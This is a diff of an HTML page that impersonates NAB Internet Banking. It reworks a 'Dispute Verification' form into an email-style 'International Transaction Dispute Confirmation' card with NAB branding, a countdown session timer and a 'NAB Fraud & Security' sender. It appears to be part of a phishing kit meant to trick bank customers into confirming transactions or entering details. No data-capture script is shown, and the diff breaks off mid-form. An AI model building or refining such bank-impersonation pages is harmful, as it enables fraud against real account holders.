@@ -1,1131 +1,1094 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
+<head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>NAB Internet Banking</title>
-    <link rel="shortcut icon" href="img/favicon.svg" type="image/x-icon" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+    <title>NAB — Dispute confirmation required</title>
     <style>
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-      }
-
-      body,
-      html {
-        font-family: Arial, sans-serif;
-        height: 100%;
-      }
-
-      .header_banner {
-        width: 100%;
-        background-color: #000;
-      }
-
-      .header_inner {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        max-width: 1200px;
-        margin: 0 auto;
-        padding: 15px 16px;
-        width: 100%;
-        gap: 20px;
-      }
-
-      .header_left {
-        display: flex;
-        align-items: center;
-      }
-
-      .header_right {
-        color: #fff;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-      }
-
-      .header_right p {
-        font-size: 0.8em;
-        padding: 10px;
-      }
-
-      .banner {
-        position: relative;
-        min-height: 100vh;
-        background-image: url("img/bg-login.jpeg");
-        background-repeat: no-repeat;
-        background-size: cover;
-        background-position: center top;
-        background-attachment: fixed;
-        display: flex;
-        flex-direction: column;
-        overflow: hidden;
-      }
-
-      .login_wrapper {
-        position: relative;
-        width: 100%;
-        max-width: 500px;
-        margin-top: 40px;
-        margin-left: 300px;
-        background-color: white;
-        border-radius: 8px;
-        overflow: hidden;
-      }
-
-      .security-questions-icon {
-        width: 45px;
-        height: 45px;
-      }
-      .security-questions-header {
-        font-family: "SourceSans-Light";
-        font-size: 1.5em;
-      }
-      .form_container {
-        position: relative;
-        width: 100%;
-        height: 150%;
-        padding: 38px 32px;
-        padding-bottom: 0px;
-      }
-
-      .loading-div {
-        position: absolute;
-        width: 100%;
-        top: 30%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-      }
-
-      .input_field {
-        margin-bottom: 20px;
-      }
-
-      .input_field label {
-        font-size: 14px;
-        color: #000;
-        display: block;
-        margin-bottom: 8px;
-        font-weight: bold;
-      }
-
-      .input_field input {
-        width: 100%;
-        padding: 12px;
-        border: 1px solid #ccc;
-        border-radius: 4px;
-        font-size: 16px;
-      }
-
-      .input_field input:focus {
-        outline: none;
-        border: 3px solid grey;
-      }
-
-      .input_error {
-        border: 1px solid rgb(194, 0, 0) !important;
-      }
-
-      .input_error:focus {
-        border: 3px solid rgb(194, 0, 0) !important;
-      }
-
-      .input_field .error {
-        color: rgb(194, 0, 0);
-        font-size: 12px;
-        margin-top: 4px;
-      }
-
-      .login_button {
-        margin-bottom: 20px;
-      }
-
-      .login_button button {
-        width: 128px;
-        padding: 12px;
-        background-color: #e2001a;
-        color: #fff;
-        border: none;
-        border-radius: 4px;
-        font-size: 16px;
-        cursor: pointer;
-      }
-
-      .login_button button:hover {
-        background-color: #d00016;
-      }
-
-      .footer_links a {
-        color: #d00016;
-      }
-
-      .footer_links a:hover {
-        text-decoration: underline;
-      }
-
-      .footer_link2 {
-        margin-top: 30px;
-        background-color: #e6e6e6;
-        padding: 20px;
-        font-size: 16px;
-        font-weight: 100;
-      }
-
-      .info {
-        color: #4d4d4d;
-        font-size: 14px;
-      }
-
-      .footer_link2 a {
-        color: #d00016;
-        font-weight: bold;
-      }
-
-      .checkbox-field {
-        display: flex;
-        align-items: center;
-        gap: 10px;
-        margin: 15px 0;
-      }
-
-      #agree {
-        height: 20px;
-        width: 20px;
-        accent-color: #e2001a;
-      }
-
-      .sec-verify-btns {
-        display: flex;
-        gap: 30px;
-        margin-top: 15px;
-      }
-
-      .back-btn {
-        background-color: #fff;
-        border: 2px solid #e2001a;
-        color: #000;
-        padding: 0.8em 3em;
-        border-radius: 4px;
-        cursor: pointer;
-        font-size: 16px;
-        font-weight: bold;
-      }
-
-      .back-btn:hover {
-        background-color: #f5f5f5;
-      }
-
-      #continueBtn {
-        width: 128px;
-        padding: 12px;
-        background-color: #e2001a;
-        color: #fff;
-        border: none;
-        border-radius: 4px;
-        font-size: 16px;
-        cursor: pointer;
-      }
-
-      #continueBtn:hover {
-        background-color: #d00016;
-      }
-
-      #continueBtn:disabled {
-        opacity: 0.6;
-        cursor: not-allowed;
-      }
-
-      .error-message {
-        color: rgb(194, 0, 0);
-        font-size: 14px;
-        margin-bottom: 1em;
-        display: none;
-      }
-
-      .error-message.show {
-        display: block;
-      }
-
-      @font-face {
-        font-family: "SourceSans-Light";
-        src: url("font/SourceSans-Light.woff2") format("woff2"),
-          url("font/SourceSans-Light.woff") format("woff");
-        font-weight: 100;
-        font-style: normal;
-      }
-
-      .loading-div {
-        display: none;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        padding: 20px;
-      }
-
-      .loader {
-        width: 40px;
-        height: 40px;
-        border: 3px solid transparent;
-        border-top: 3px solid #e60000;
-        border-right: 3px solid #e60000;
-        border-radius: 50%;
-        animation: spin 1.5s linear infinite;
-        margin: 0 auto;
-      }
-
-      .loader-message {
-        margin-top: 12px;
-        font-size: 14px;
-        color: #444;
-        text-align: center;
-        font-family: Arial, sans-serif;
-      }
-
-      @keyframes spin {
-        0% {
-          transform: rotate(0deg);
-        }
-        100% {
-          transform: rotate(360deg);
-        }
-      }
-
-      .modal-backdrop {
-        position: fixed;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-        background-color: rgba(0, 0, 0, 0.5);
-        z-index: 999;
-      }
-
-      .modal {
-        position: fixed;
-        top: 28%;
-        left: 50%;
-        transform: translate(-50%, -50%);
-        background-color: #fff;
-        padding: 40px;
-        border-radius: 8px;
-        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        z-index: 1000;
-        width: 400px;
-        height: 300px;
-        text-align: center;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-      }
-
-      .spinner {
-        width: 40px;
-        height: 40px;
-        border: 4px solid #ddd;
-        border-top: 4px solid rgb(194, 0, 0);
-        border-radius: 50%;
-        animation: spin 1s linear infinite;
-        margin: 0 auto;
-      }
-
-      @keyframes spin {
-        to {
-          transform: rotate(360deg);
-        }
-      }
-
-      /* Result screens */
-      .result-screen {
-        display: none;
-        flex-direction: column;
-        align-items: center;
-        text-align: center;
-        padding: 40px 20px 30px;
-      }
-
-      .result-icon-ring {
-        width: 72px;
-        height: 72px;
-        border-radius: 50%;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 34px;
-        margin-bottom: 18px;
-      }
-
-      .result-screen h2 {
-        font-size: 22px;
-        font-weight: 800;
-        margin-bottom: 10px;
-        color: #003366;
-      }
-
-      .result-screen p {
-        font-size: 14px;
-        color: #555;
-        max-width: 380px;
-        line-height: 1.6;
-        margin-bottom: 6px;
-      }
-
-      .result-ref {
-        margin-top: 18px;
-        padding: 10px 16px;
-        background: #f3f3f3;
-        border-radius: 6px;
-        font-size: 13px;
-        color: #999;
-        width: 100%;
-        max-width: 340px;
-      }
-
-      .result-ref strong {
-        color: #555;
-      }
-
-      .btn-next-steps {
-        margin-top: 20px;
-        padding: 12px 28px;
-        border-radius: 6px;
-        border: none;
-        font-size: 15px;
-        font-weight: 700;
-        cursor: pointer;
-        font-family: Arial, sans-serif;
-        transition: background 0.15s;
-        text-decoration: none;
-        display: inline-block;
-        color: #fff;
-      }
-
-      .btn-next-steps:hover {
-        filter: brightness(0.9);
-      }
-
-      .btn-confirmed-next {
-        background: #1A6E44;
-      }
-
-      .btn-confirmed-next:hover {
-        background: #155a38;
-      }
-
-      .btn-denied-next {
-        background: #003366;
-      }
-
-      .btn-denied-next:hover {
-        background: #002244;
-      }
-
-      #card-confirmed,
-      #card-denied {
-        display: none;
-      }
-
-      .green-bg {
-        background: #EAF6EF;
-      }
-
-      .red-bg {
-        background: #FDECEA;
-      }
-
-      .green-text {
-        color: #1A6E44;
-      }
-
-      @media screen and (max-width: 768px) {
-        .header_inner {
-          display: flex;
-          justify-content: space-between;
-          padding: 10px 16px;
+        /* ── NAB Design Tokens ── */
+        :root {
+            --nab-blue: #003366;
+            --nab-dark: #003366;
+            --nab-light-bg: #f3f3f3;
+            --nab-border: #c7ced2;
+            --amber: #F5A623;
+            --amber-bg: #FFF8EC;
+            --amber-border: #F5D88A;
+            --green: #1A6E44;
+            --green-bg: #EAF6EF;
+            --red: #e2001a;
+            --red-bg: #FDECEA;
+            --text-primary: #003366;
+            --text-secondary: #555;
+            --text-muted: #999;
+            --surface: #FFFFFF;
+            --page-bg: #f3f3f3;
+            --divider: #e2e2e2;
+            --font: "Gordita", Arial, Verdana, sans-serif;
+            --font-bold: "Gordita Bold", Arial, Verdana, sans-serif;
+            --radius: 8px;
+            --shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
         }
 
-        .header_left {
-          margin-left: 0;
-          margin-bottom: 10px;
+        /* ── Reset ── */
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
 
-        .header_right {
-          display: none;
+        html,
+        body {
+            min-height: 100%;
+            font-family: var(--font);
+            font-size: 16px;
+            line-height: 1.6;
+            color: var(--text-secondary);
+            background: var(--page-bg);
         }
 
-        .login_wrapper {
-          width: 90%;
-          margin: 50px auto;
-          background-color: white;
-          border-radius: 8px;
-          overflow: hidden;
+        body {
+            display: flex;
+            flex-direction: column;
         }
 
-        .form_container {
-          padding: 20px;
+        a {
+            color: var(--nab-blue);
+            text-decoration: none;
+        }
+        a:hover {
+            color: #16639f;
+            text-decoration: underline;
         }
 
-        .sec-verify-btns {
-          flex-direction: column;
-          gap: 10px;
-          align-items: center;
+        /* ── NAB Header ── */
+        .nab-header {
+            background: #000;
+            padding: 12px 0;
+            border-bottom: 1px solid var(--divider);
+            position: sticky;
+            top: 0;
+            z-index: 10;
         }
 
-        .back-btn {
-          width: 100%;
-          padding: 0.8em 1em;
+        .nab-header .header-inner {
+            max-width: 1170px;
+            margin: 0 auto;
+            padding: 0 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
         }
 
-        #continueBtn {
-          width: 100%;
+        .nab-header .header-logo img {
+            height: 32px;
+            width: auto;
+            display: block;
         }
 
-        .security-questions-icon {
-          width: 40px;
-          height: 40px;
+        .nab-header .header-contact {
+            font-size: 13px;
+            color: #fff;
         }
-        .security-questions-header {
-          font-size: 1.2em;
-        }
-        #agree {
-          height: 25px;
-          width: 25px;
-        }
-      }
 
-      @media (max-width: 480px) {
+        .nab-header .header-contact a {
+            color: #fff;
+            font-weight: 600;
+            white-space: nowrap;
+        }
+
+        @media (max-width: 480px) {
+            .nab-header .header-logo img {
+                height: 26px;
+            }
+            .nab-header .header-contact {
+                font-size: 11px;
+            }
+        }
+
+        /* ── Session bar ── */
+        .session-bar {
+            background: var(--nab-dark);
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.7);
+            flex-wrap: wrap;
+            gap: 4px;
+        }
+
+        .session-bar span:first-child {
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .session-bar #timer {
+            color: #fff;
+            transition: color 0.3s;
+            font-weight: 600;
+        }
+
+        .session-bar #timer.warning {
+            color: #fca5a5;
+        }
+
+        @media (max-width: 480px) {
+            .session-bar {
+                font-size: 11px;
+                padding: 6px 12px;
+            }
+        }
+
+        /* ── Main ── */
+        main {
+            flex: 1;
+            padding: 20px 12px 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        @media (min-width: 676px) {
+            main {
+                padding: 32px 24px 60px;
+            }
+        }
+
+        /* ── Step indicator ── */
+        .steps {
+            display: flex;
+            align-items: center;
+            gap: 0;
+            margin-bottom: 20px;
+            width: 100%;
+            max-width: 640px;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-muted);
+            flex: 1;
+            justify-content: center;
+            position: relative;
+        }
+
+        .step::after {
+            content: '';
+            position: absolute;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 1px;
+            height: 20px;
+            background: var(--divider);
+        }
+
+        .step:last-child::after {
+            display: none;
+        }
+
+        .step.active {
+            color: var(--nab-blue);
+        }
+        .step.done {
+            color: var(--green);
+        }
+
+        .step-num {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: var(--divider);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+
+        .step.active .step-num {
+            background: var(--nab-blue);
+            color: #fff;
+        }
+        .step.done .step-num {
+            background: var(--green);
+            color: #fff;
+        }
+
+        @media (max-width: 480px) {
+            .step {
+                font-size: 10px;
+                gap: 4px;
+            }
+            .step-num {
+                width: 20px;
+                height: 20px;
+                font-size: 10px;
+            }
+        }
+
+        /* ── Card ── */
+        .card {
+            background: var(--surface);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            width: 100%;
+            max-width: 640px;
+            overflow: hidden;
+        }
+
+        /* ── Email header ── */
+        .email-header {
+            padding: 16px 18px 14px;
+            border-bottom: 1px solid var(--divider);
+            background: #fafbfc;
+        }
+
+        .email-header .email-from-to {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 2px 16px;
+            font-size: 13px;
+        }
+
+        .email-header .email-from-to .label {
+            color: var(--text-muted);
+            font-weight: 500;
+            min-width: 44px;
+        }
+
+        .email-header .email-from-to .value {
+            color: var(--text-primary);
+            font-weight: 500;
+        }
+
+        .email-header .email-subject {
+            margin-top: 6px;
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--text-primary);
+            font-family: var(--font-bold);
+        }
+
+        .email-header .email-date {
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-top: 2px;
+        }
+
+        @media (max-width: 480px) {
+            .email-header {
+                padding: 12px 14px 10px;
+            }
+            .email-header .email-from-to {
+                font-size: 12px;
+                flex-direction: column;
+                gap: 1px;
+            }
+            .email-header .email-subject {
+                font-size: 14px;
+            }
+        }
+
+        /* ── Email body ── */
+        .email-body {
+            padding: 16px 18px 8px;
+            font-size: 14px;
+            line-height: 1.7;
+            color: var(--text-secondary);
+        }
+
+        .email-body p {
+            margin-bottom: 12px;
+        }
+
+        .email-body p:last-child {
+            margin-bottom: 0;
+        }
+
+        .email-body .greeting {
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .email-body .sign-off {
+            margin-top: 6px;
+            color: var(--text-primary);
+        }
+
+        .email-body .sign-off strong {
+            font-weight: 700;
+        }
+
+        @media (max-width: 480px) {
+            .email-body {
+                padding: 12px 14px 6px;
+                font-size: 13px;
+            }
+        }
+
+        /* ── Transaction block ── */
+        .txn-block-email {
+            margin: 10px 0 14px;
+            border: 1px solid var(--nab-border);
+            border-radius: 6px;
+            overflow: hidden;
+            background: #fafbfc;
+        }
+
+        .txn-top-email {
+            padding: 10px 14px;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            border-bottom: 1px solid var(--nab-border);
+            background: #f8f9fa;
+            gap: 8px;
+        }
+
+        .txn-merchant-email {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--text-primary);
+            font-family: var(--font-bold);
+        }
+        .txn-category-email {
+            font-size: 11px;
+            color: var(--text-secondary);
+            margin-top: 1px;
+        }
+        .txn-amount-email {
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--red);
+            text-align: right;
+            font-family: var(--font-bold);
+            flex-shrink: 0;
+        }
+        .txn-currency-email {
+            font-size: 10px;
+            color: var(--text-muted);
+            text-align: right;
+            margin-top: 1px;
+        }
+
+        .txn-details-email {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+        }
+
+        .txn-detail-email {
+            padding: 8px 14px;
+            border-bottom: 1px solid var(--divider);
+            border-right: 1px solid var(--divider);
+            background: #fff;
+        }
+
+        .txn-detail-email:nth-child(2n) {
+            border-right: none;
+        }
+        .txn-detail-email:nth-last-child(-n+2) {
+            border-bottom: none;
+        }
+
+        .txn-detail-email label {
+            display: block;
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            color: var(--text-muted);
+            margin-bottom: 1px;
+            font-weight: 600;
+        }
+
+        .txn-detail-email span {
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+
+        @media (max-width: 480px) {
+            .txn-top-email {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .txn-amount-email {
+                text-align: left;
+                margin-top: 2px;
+            }
+            .txn-currency-email {
+                text-align: left;
+            }
+            .txn-details-email {
+                grid-template-columns: 1fr;
+            }
+            .txn-detail-email {
+                border-right: none !important;
+            }
+            .txn-detail-email:nth-last-child(-n+2) {
+                border-bottom: 1px solid var(--divider);
+            }
+            .txn-detail-email:last-child {
+                border-bottom: none !important;
+            }
+            .txn-merchant-email {
+                font-size: 14px;
+            }
+            .txn-amount-email {
+                font-size: 18px;
+            }
+        }
+
+        /* ── Question block ── */
+        .question-block-email {
+            padding: 14px 18px 0;
+        }
+
+        .question-block-email h2 {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+            font-family: var(--font-bold);
+        }
+
+        .question-block-email p {
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+        }
+
+        @media (max-width: 480px) {
+            .question-block-email {
+                padding: 10px 14px 0;
+            }
+            .question-block-email h2 {
+                font-size: 15px;
+            }
+            .question-block-email p {
+                font-size: 12px;
+            }
+        }
+
+        /* ── Buttons ── */
+        .btn-group-email {
+            padding: 14px 18px 16px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
+
+        .btn {
+            padding: 12px 14px;
+            border-radius: 6px;
+            border: none;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: background 0.15s, transform 0.1s;
+            font-family: var(--font);
+            min-width: 100px;
+            text-align: center;
+            touch-action: manipulation;
+        }
+
+        .btn:hover {
+            filter: brightness(0.92);
+        }
+        .btn:active {
+            transform: scale(0.97);
+        }
+        .btn:focus-visible {
+            outline: 3px solid var(--nab-blue);
+            outline-offset: 2px;
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            filter: none;
+            transform: none;
+        }
+
+        .btn-confirm-dispute {
+            background: var(--green);
+            color: #fff;
+        }
+
+        .btn-confirm-dispute:hover {
+            background: #155a38;
+        }
+
+        .btn-authorize {
+            background: var(--nab-blue);
+            color: #fff;
+        }
+
+        .btn-authorize:hover {
+            background: #002244;
+        }
+
+        @media (max-width: 480px) {
+            .btn-group-email {
+                grid-template-columns: 1fr;
+                padding: 10px 14px 14px;
+                gap: 8px;
+            }
+            .btn-authorize {
+                order: -1;
+            }
+            .btn {
+                font-size: 13px;
+                padding: 14px 12px;
+            }
+        }
+
+        /* ── Security note ── */
+        .security-note-email {
+            margin: 0 18px 18px;
+            padding: 10px 12px;
+            background: #f8f9fa;
+            border: 1px solid var(--divider);
+            border-radius: 6px;
+            display: flex;
+            gap: 8px;
+            align-items: flex-start;
+            font-size: 12px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+        }
+
+        .security-note-email .security-note-icon {
+            font-size: 14px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .security-note-email strong {
+            color: var(--text-primary);
+        }
+
+        @media (max-width: 480px) {
+            .security-note-email {
+                margin: 0 14px 14px;
+                font-size: 11px;
+                padding: 8px 10px;
+            }
+        }
+
+        /* ── Result screens ── */
         .result-screen {
-          padding: 24px 16px 20px;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            padding: 32px 20px 28px;
         }
-        .result-screen h2 {
-          font-size: 18px;
-        }
-        .result-screen p {
-          font-size: 12px;
-        }
-        .result-icon-ring {
-          width: 56px;
-          height: 56px;
-          font-size: 26px;
-        }
-        .result-ref {
-          font-size: 11px;
-        }
-      }
-    </style>
-  </head>
-  <body>
-    <div class="header_banner" id="headerBanner">
-      <div class="header_inner">
-        <div class="header_left">
-          <img
-            class="logo-img"
-            src="img/star-big.svg"
-            alt=""
-            height="30"
-            width="90"
-          />
-          <h1 style="color: #fff; font-size: 22px; margin: 0">
-            Internet Banking
-          </h1>
-        </div>
-        <div class="header_right">
-          <p id="currentDate"></p>
-          |
-          <p>Help</p>
-          |
-          <p>Security</p>
-          |
-          <p>Contact us</p>
-          |
-          <p>Locate us</p>
-        </div>
-      </div>
 
-      <div class="banner">
-        <div class="login_wrapper" style="width: 90%">
-          <div class="form_container">
-            <div
-              class="loading-div"
-              style="justify-content: center; align-items: center; margin: auto"
-            >
-              <div class="loader"></div>
-              <div class="loader-message">
-                <p>
-                  This process may take a few minutes. <br />Do not refresh or
-                  close this page.
-                </p>
-              </div>
+        .result-icon-ring {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            margin-bottom: 16px;
+            flex-shrink: 0;
+        }
+
+        .result-screen h2 {
+            font-size: 20px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            color: var(--text-primary);
+            font-family: var(--font-bold);
+        }
+
+        .result-screen p {
+            font-size: 13px;
+            color: var(--text-secondary);
+            max-width: 380px;
+            line-height: 1.6;
+            margin-bottom: 4px;
+        }
+
+        .result-ref {
+            margin-top: 16px;
+            padding: 8px 14px;
+            background: var(--page-bg);
+            border-radius: 6px;
+            font-size: 12px;
+            color: var(--text-muted);
+            width: 100%;
+            max-width: 340px;
+            word-break: break-word;
+        }
+
+        .result-ref strong {
+            color: var(--text-secondary);
+        }
+
+        .btn-next-steps {
+            margin-top: 18px;
+            padding: 12px 24px;
+            border-radius: 6px;
+            border: none;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: var(--font);
+            transition: background 0.15s;
+            text-decoration: none;
+            display: inline-block;
+            color: #fff;
+            touch-action: manipulation;
+        }
+
+        .btn-next-steps:hover {
+            filter: brightness(0.9);
+        }
+        .btn-next-steps:active {
+            transform: scale(0.97);
+        }
+
+        .btn-confirmed-next {
+            background: var(--green);
+        }
+        .btn-confirmed-next:hover {
+            background: #155a38;
+        }
+        .btn-denied-next {
+            background: var(--nab-blue);
+        }
+        .btn-denied-next:hover {
+            background: #002244;
+        }
+
+        @media (max-width: 480px) {
+            .result-screen {
+                padding: 24px 16px 20px;
+            }
+            .result-screen h2 {
+                font-size: 18px;
+            }
+            .result-screen p {
+                font-size: 12px;
+            }
+            .result-icon-ring {
+                width: 56px;
+                height: 56px;
+                font-size: 26px;
+            }
+            .result-ref {
+                font-size: 11px;
+            }
+        }
+
+        /* ── NAB Footer ── */
+        .nab-footer {
+            background: var(--nab-dark);
+            color: #fff;
+            padding: 20px 0;
+            margin-top: auto;
+        }
+
+        .nab-footer .footer-inner {
+            max-width: 1170px;
+            margin: 0 auto;
+            padding: 0 16px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .nab-footer .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px 20px;
+        }
+
+        .nab-footer .footer-links a {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .nab-footer .footer-links a:hover {
+            color: #fff;
+            text-decoration: underline;
+        }
+
+        .nab-footer .footer-copy {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        @media (max-width: 675px) {
+            .nab-footer .footer-inner {
+                flex-direction: column;
+                gap: 10px;
+                text-align: center;
+            }
+            .nab-footer .footer-links {
+                justify-content: center;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .nab-footer {
+                padding: 16px 0;
+            }
+            .nab-footer .footer-links a {
+                font-size: 11px;
+            }
+            .nab-footer .footer-copy {
+                font-size: 10px;
+            }
+        }
+
+        /* ── Spin animation ── */
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* ── Utility ── */
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            border: 0;
+        }
+
+        /* ── Fix for very small screens ── */
+        @media (max-width: 380px) {
+            .nab-header .header-logo img {
+                height: 22px;
+            }
+            .nab-header .header-contact {
+                font-size: 10px;
+            }
+            .step {
+                font-size: 9px;
+            }
+            .step-num {
+                width: 18px;
+                height: 18px;
+                font-size: 9px;
+            }
+            .email-header .email-subject {
+                font-size: 13px;
+            }
+            .txn-merchant-email {
+                font-size: 13px;
+            }
+            .txn-amount-email {
+                font-size: 16px;
+            }
+            .btn {
+                font-size: 12px;
+                padding: 12px 10px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- ── NAB HEADER ── -->
+    <header class="nab-header" role="banner">
+        <div class="header-inner">
+            <a class="header-logo" href="#" title="NAB">
+                <img src="img/star-big.svg" alt="NAB" height="30" width="90">
+            </a>
+            <div class="header-contact">
+                Need help? <a href="tel:1300555722">13 00 555 722</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- ── Session bar ── -->
+    <div class="session-bar">
+        <span>Internet Banking</span>
+        <span>Session timeout: <span id="timer">09:58</span></span>
+    </div>
+
+    <!-- ── Main ── -->
+    <main>
+
+        <!-- Step indicator -->
+        <div class="steps" id="steps">
+            <div class="step active" id="step1">
+                <div class="step-num">1</div>
+                Review
+            </div>
+            <div class="step" id="step2">
+                <div class="step-num">2</div>
+                Confirm
+            </div>
+            <div class="step" id="step3">
+                <div class="step-num">3</div>
+                Done
+            </div>
+        </div>
+
+        <!-- ── Email-style verification card ── -->
+        <div class="card" id="card-verify">
+
+            <!-- Email header -->
+            <div class="email-header">
+                <div class="email-from-to">
+                    <span><span class="label"></span> <span class="value">NAB Fraud &amp; Security</span></span>
+                    <span><span class="label"></span> <span class="value"></span></span>
+                </div>
+                <div class="email-subject">International Transaction Dispute Confirmation</div>
+                <div class="email-date"></div>
             </div>
 
-            <!-- Main Form -->
-            <form id="loginForm" novalidate>
-              <div
-                class="security-questiion-header"
-                style="
-                  display: flex;
-                  align-items: center;
-                  gap: 15px;
-                  margin-bottom: 2em;
-                "
-              >
-                <svg
-                  fill="#c22424"
-                  viewBox="0 0 35 35"
-                  data-name="Layer 2"
-                  id="Layer_2"
-                  xmlns="http://www.w3.org/2000/svg"
-                  stroke="#c22424"
-                  stroke-width="0.00035"
-                  class="security-questions-icon"
-                >
-                  <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
-                  <g
-                    id="SVGRepo_tracerCarrier"
-                    stroke-linecap="round"
-                    stroke-linejoin="round"
-                    stroke="#CCCCCC"
-                    stroke-width="0.07"
-                  ></g>
-                  <g id="SVGRepo_iconCarrier">
-                    <path
-                      d="M17.5,34.44A3.07,3.07,0,0,1,15.89,34L9.82,30.45A14.79,14.79,0,0,1,2.25,17.7V8A3.2,3.2,0,0,1,4.34,5L16.4.57a3.2,3.2,0,0,1,2.2,0L30.66,5a3.2,3.2,0,0,1,2.09,3V17.7a14.79,14.79,0,0,1-7.57,12.75L19.11,34A3.07,3.07,0,0,1,17.5,34.44Zm0-31.56a.67.67,0,0,0-.24,0L5.2,7.33A.69.69,0,0,0,4.75,8V17.7a12.3,12.3,0,0,0,6.33,10.59l6.07,3.56a.73.73,0,0,0,.7,0l6.07-3.56h0A12.3,12.3,0,0,0,30.25,17.7V8a.69.69,0,0,0-.45-.65L17.74,2.92A.67.67,0,0,0,17.5,2.88Z"
-                    ></path>
-                    <path
-                      d="M16.4,22.35a1.3,1.3,0,0,1-.81-.29l-4.27-3.6a1.25,1.25,0,0,1,1.61-1.92l3.35,2.82L22,13.06a1.25,1.25,0,0,1,1.86,1.68l-6.48,7.2A1.27,1.27,0,0,1,16.4,22.35Z"
-                    ></path>
-                  </g>
-                </svg>
-                <h2 class="security-questions-header">
-                  Dispute Verification
-                </h2>
-              </div>
+            <!-- Email body -->
+            <div class="email-body">
+                <p class="greeting"></p>
+                <p></p>
+                <p><strong>We need your confirmation before we can proceed with the dispute.</strong></p>
 
-              <!-- Transaction Details -->
-              <div class="input_field">
-                <label for="transactionDate">Transaction Date</label>
-                <input
-                  type="text"
-                  id="transactionDate"
-                  name="transactionDate"
-                  placeholder="e.g. 03 Jul 2026"
-                />
-                <div id="error-transactionDate" class="error"></div>
-              </div>
-
-              <div class="input_field">
-                <label for="merchantName">Merchant Name</label>
-                <input
-                  type="text"
-                  id="merchantName"
-                  name="merchantName"
-                  placeholder="e.g. Al Maya Group"
-                />
-                <div id="error-merchantName" class="error"></div>
-              </div>
-
-              <div class="input_field">
-                <label for="amount">Transaction Amount (AUD)</label>
-                <input
-                  type="text"
-                  id="amount"
-                  name="amount"
-                  placeholder="e.g. 1849.00"
-                />
-                <div id="error-amount" class="error"></div>
-              </div>
-
-              <div class="input_field">
-                <label for="disputeId">Dispute ID</label>
-                <input
-                  type="text"
-                  id="disputeId"
-                  name="disputeId"
-                  placeholder="e.g. NAB-DIS-20260703-8849"
-                />
-                <div id="error-disputeId" class="error"></div>
-              </div>
-
-              <div class="error-message" id="errorMessage">
-                Please check all required fields.
-              </div>
-
-              <div class="checkbox-field">
-                <input type="checkbox" id="agree" name="agree" />
-                <label for="agree" style="font-size: 0.9em"
-                  >I confirm that I did not authorise this transaction.</label
-                >
-              </div>
-
-              <div class="sec-verify-btns">
-                <button type="button" class="back-btn" id="backBtn">
-                  Back
-                </button>
